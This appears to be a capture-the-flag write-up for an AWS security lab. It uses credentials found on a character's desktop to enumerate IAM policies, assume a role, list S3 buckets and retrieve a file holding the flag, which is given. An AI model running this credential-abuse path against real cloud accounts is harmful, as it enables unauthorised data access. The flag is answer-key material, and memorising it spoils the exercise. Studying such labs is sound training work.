# Day 23: AWS Security - S3cret Santa

> One of our stealthiest infiltrated elves managed to hop their way into Sir Carrotbane’s office and, lo and behold, discovered a bundle of cloud credentials just lying around on his desktop like forgotten carrots. The agent suspects these could be the key to regaining access to TBFC’s cloud network. If only the poor hare had the faintest clue what “the cloud” is, he’d burrow in himself. Let's help the elf utilise these credentials to try to regain access to TBFC's cloud network.

## Solution

- On running the command `aws sts get-caller-identity`, we get the account parameter as `123456789012`
- IAM policies control what action, on which resource, under which condition and for whom it is allowed 
- By running `aws iam list-user-policies --user-name sir.carrotbane` we see only policyname which is `SirCarrotBanePolicy`
- By running `aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy` we see that bucketmaster can perform 3 actions
```
ListAllMyBuckets
ListBucket
GetObject
```
- For Task 5, first we need to gain access to the list all buckets action which is held by the bucketmaster role
- By running `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC`
- We will export the values as `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN` respectively
- We can check our identity now by running `aws sts get-caller-identity`
- We can list the buckets using `aws s3api list-buckets` 
- In the easter-secrets bucket, we see a cloud_password.txt file
- By running `aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt`
- By `cat cloud_password.txt` we get the final flag as `THM{more_like_sir_cloudbane}`

## Objectives

### What are the contents of the cloud_password.txt file?
> THM{more_like_sir_cloudbane}

## Concepts learnt:

- Learn the basics of AWS accounts.
- Enumerate the privileges granted to an account, from an attacker's perspective.